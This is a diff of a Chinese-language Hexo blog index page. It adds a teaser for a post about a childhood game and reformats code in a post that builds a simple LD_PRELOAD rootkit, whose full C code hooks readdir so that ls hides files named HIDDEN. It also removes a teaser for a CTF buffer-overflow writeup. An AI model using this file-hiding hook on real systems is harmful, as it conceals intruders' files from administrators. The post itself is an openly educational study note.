@@ -171,6 +171,68 @@
 
       <div class="body-wrap">
   
+    <article id="post-小朋友下樓梯輔助程式" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/14/小朋友下樓梯輔助程式/" class="article-date">
+  	<time datetime="2016-11-14T14:01:30.000Z" itemprop="datePublished">2016-11-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/14/小朋友下樓梯輔助程式/">小朋友下樓梯輔助程式</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F"><a href="#u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F" class="headerlink" title="小朋友下樓梯是啥？"></a>小朋友下樓梯是啥？</h2><p>它不僅是一個很狂的小遊戲</p>
+<p>它更代表了我們的童年回憶</p>
+<p><br><br><img src="/images/pic7.png" alt="圖7"></p>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a  href="/2016/11/14/小朋友下樓梯輔助程式/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Linux-project-PGD-present-bit" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -262,7 +324,7 @@
         <h2 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h2><p>因Linux Operating System課的project需要，人生第一次編Kernel就獻給他惹，所以怕忘就順手筆記一下。</p>
 <h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p>使用Ubuntu 16.04 LTS i386 Desktop<br>要編的Kernel是3.10版</p>
 <h2 id="u904E_u7A0B"><a href="#u904E_u7A0B" class="headerlink" title="過程"></a>過程</h2><p>一開始當然要先裝好Linux環境(我是裝Ubuntu)<br>然後決定你要編的Kernel，並載下來解壓縮<br>(Kernel source可以到<a href="https://www.kernel.org" target="_blank" rel="external">https://www.kernel.org</a> 下載)<br>我這邊解壓縮出來後是linux-3.10.104/</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> linux-3.10.104/</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cd linux-3.10.104/</div></pre></td></tr></table></figure>
       
     </div>
     
@@ -385,8 +447,8 @@
         <h2 id="LD_PRELOAD"><a href="#LD_PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫<br>它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號<br>所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉<br>但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都已經包進程式中</p>
 <h2 id="u5BE6_u4F5C"><a href="#u5BE6_u4F5C" class="headerlink" title="實作"></a>實作</h2><p>因為ls用到readdir這個函數來實作<br>所以我們覆蓋掉libc裡面的readdir來實作rootkit<br>做法很簡單，載入libc中原本的readdir(我們叫它old_readdir)<br>然後把結果中有”HIDDEN”的都濾掉</p>
 <p>code如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span> *libc = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *(*<span class="title">old_readdir</span>)(<span class="title">DIR</span> *<span class="title">dirp</span>);</span></div><div class="line"></div><div class="line"><span class="function">struct dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span> </span>&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">ret</span> = <span class="title">NULL</span>;</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == libc) &#123;</div><div class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (libc = dlopen(<span class="string">"/lib/libc.so.6"</span>, RTLD_LAZY))) &#123;</div><div class="line">			<span class="keyword">goto</span> END;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == old_readdir) &#123;</div><div class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (old_readdir = dlsym(libc, <span class="string">"readdir"</span>))) &#123;</div><div class="line">			<span class="keyword">goto</span> END;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		ret = old_readdir(dirp);</div><div class="line">		<span class="keyword">if</span> (ret &amp;&amp; <span class="number">0</span> == <span class="built_in">strcmp</span>(ret-&gt;d_name, <span class="string">"HIDDEN"</span>)) &#123;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">END:</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>編譯一下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gcc -fPIC -shared -o rootkit.so rootkit.c</span></div></pre></td></tr></table></figure></p>
-<p>設置LD_PRELOAD並執行ls<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ /bin/ls</div><div class="line">rootkit<span class="selector-class">.c</span> rootkit<span class="selector-class">.so</span> HIDDEN</div><div class="line">$ env LD_PRELOAD=./rootkit<span class="selector-class">.so</span> /bin/ls</div><div class="line">rootkit<span class="selector-class">.c</span> rootkit.so</div></pre></td></tr></table></figure></p>
+<p>編譯一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gcc -fPIC -shared -o rootkit.so rootkit.c</div></pre></td></tr></table></figure></p>
+<p>設置LD_PRELOAD並執行ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ /bin/ls</div><div class="line">rootkit.c rootkit.so HIDDEN</div><div class="line">$ env LD_PRELOAD=./rootkit.so /bin/ls</div><div class="line">rootkit.c rootkit.so</div></pre></td></tr></table></figure></p>
 <p>即可發現當前目錄下名字為HIDDEN的都消失了，就算下參數-al也一樣</p>
 
       
@@ -418,70 +480,9 @@
 
 
   
-    <article id="post-project1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/01/16/project1/" class="article-date">
-  	<time datetime="2016-01-16T15:10:19.000Z" itemprop="datePublished">2016-01-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/01/16/project1/">攻防Project1 Writeup</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D"><a href="#u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D" class="headerlink" title="第一題：BOF easy [ pwn ]"></a>第一題：BOF easy [ pwn ]</h2><h3 id="u984C_u76EE"><a href="#u984C_u76EE" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Congrat !!Congrat"</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Buffer overerflow is easy"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Read your input :"</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    read(fflush0,buf,<span class="number">100</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="u89E3_u984C_u601D_u8DEF"><a href="#u89E3_u984C_u601D_u8DEF" class="headerlink" title="解題思路"></a>解題思路</h3><p>l33t()中有system(“/bin/sh”)，所以目標就是執行l33t()<br>由code可知buf長度20，但read()讀100個bytes，代表這裡可以buffer overflow<br>並且這題沒有ASLR，所以用objdump可以找出l33t()的address為0x80484fd<br>接著，只需要將main()的return address蓋成0x80484fd即可<br>payload:<br>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NCU/">NCU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/01/16/project1/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
     </nav>
   
 </div>
@@ -489,7 +490,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 KaiBro
+    		&copy; 2019 KaiBro
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
